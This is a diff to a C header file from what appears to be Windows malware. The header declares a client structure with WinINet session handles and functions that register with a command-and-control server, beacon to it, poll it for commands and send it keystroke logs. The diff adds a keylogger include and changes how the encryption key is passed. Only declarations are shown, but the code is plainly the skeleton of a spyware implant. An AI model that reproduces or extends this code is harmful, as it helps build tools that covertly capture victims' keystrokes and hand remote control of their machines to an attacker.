@@ -3,6 +3,7 @@
 #include <wininet.h>
 
 #include "../program/utils.h"
+#include "../keylogger/keylogger.h"
 
 #ifndef UTIL_H
 #define UTIL_H
@@ -21,19 +22,17 @@ typedef struct {
     char id[MAX_ID_LEN];
     char cmdBuffer[MAX_BUFF_LEN];
 
-    unsigned char ENC_KEY;
-
     HINTERNET hSession; // internet session
     HINTERNET hConnect; // server connection handle
 } CLIENT_HANDLER;
 
 CLIENT_HANDLER* initClient();
 
-ERR_CODE registerClient(CLIENT_HANDLER* client);
+ERR_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey);
 
 // functions utilised by the worker threads!
 ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER* client); // beacon and recieve commands from the C2
-ERR_CODE writeKeyLog(CLIENT_HANDLER* client, const char* keyBuffer, const int bufferLen);  // write 
+ERR_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger);  // write 
 
 void clientCleanup(CLIENT_HANDLER* client);
 
